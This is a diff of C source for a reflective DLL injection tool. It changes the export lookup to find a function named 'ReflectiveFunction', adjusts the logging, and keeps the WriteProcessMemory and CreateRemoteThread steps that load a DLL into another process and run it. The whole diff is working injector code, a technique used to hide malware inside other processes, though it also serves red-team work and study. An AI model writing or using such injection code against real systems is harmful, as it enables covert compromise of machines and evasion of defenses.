@@ -160,7 +160,6 @@ DWORD GetReflectiveLdrOffset
 	IN UINT_PTR ReflectiveLdrBuffer
 )
 {
-	// fancy formatting :)
 	PIMAGE_NT_HEADERS64			pImgNt					= NULL;
 	PIMAGE_EXPORT_DIRECTORY		pImgExportDir			= NULL;
 	PDWORD						pdwFuncNameArray		= NULL;
@@ -182,11 +181,12 @@ DWORD GetReflectiveLdrOffset
 
 		PCHAR ExportedFunctionName = (PCHAR)(ReflectiveLdrBuffer + RvaOffset(pdwFuncNameArray[i], ReflectiveLdrBuffer));
 
-		if (strcmp(ExportedFunctionName, "ReflectiveLoader") == 0)
+		if (strcmp(ExportedFunctionName, "ReflectiveFunction") == 0)
 		{
 			DWORD functionRVA = pdwFuncAddressArray[pdwFuncOrdinalArray[i]];
 			DWORD fileOffset = RvaOffset(functionRVA, ReflectiveLdrBuffer);
 
+			INFO("[0x%p] File Offset");
 			return fileOffset;
 		}
 
@@ -218,7 +218,7 @@ BOOL InjectReflectiveDll
 		return FALSE;
 	}
 
-	INFO("Allocated %zu bytes at --> [0x%p]", ReflectiveDllSize, pBuffer);
+	INFO("Allocated %lu bytes at --> [0x%p]", ReflectiveDllSize, pBuffer);
 
 	if (!WriteProcessMemory(hProcess, pBuffer, ReflectiveDllBuffer, ReflectiveDllSize, &NumberOfBytesWritten))
 	{
@@ -226,31 +226,18 @@ BOOL InjectReflectiveDll
 		return FALSE;
 	}
 
-	INFO("Wrote %d of %d bytes", NumberOfBytesWritten, ReflectiveDllSize);
+	INFO("Wrote %zu of %lu bytes", NumberOfBytesWritten, ReflectiveDllSize);
 
-	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pBuffer + ReflectiveFunctionOffset), pBuffer, 0, &TID)))
+	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pBuffer + ReflectiveFunctionOffset), NULL, 0, &TID)))
 	{
 		PRINT_ERROR("CreateRemoteThread");
 		return FALSE;
 	}
 
+	INFO("Reflective Function Offset --> [0x%p]", ReflectiveFunctionOffset);
+	INFO("Creating New Thread --> [0x%p]", (PVOID)(pBuffer + ReflectiveFunctionOffset));
+
 	INFO("Executed Reflective Loader!");
-
-	// Debugging
-
-	/*getchar();
-
-	printf("[DEBUG] Thread created with TID: %d\n", TID);
-
-	DWORD waitResult = WaitForSingleObject(hThread, 5000);
-	printf("[DEBUG] Wait result: %d\n", waitResult);
-
-	DWORD exitCode;
-	if (GetExitCodeThread(hThread, &exitCode))
-	{
-		printf("[DEBUG] Thread exit code: 0x%X\n", exitCode);
-	}*/
-
 
 	CloseHandle(hThread);
 
